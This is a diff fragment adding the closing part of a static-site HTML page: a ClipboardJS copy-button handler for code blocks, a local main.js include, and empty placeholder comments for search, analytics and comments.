+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
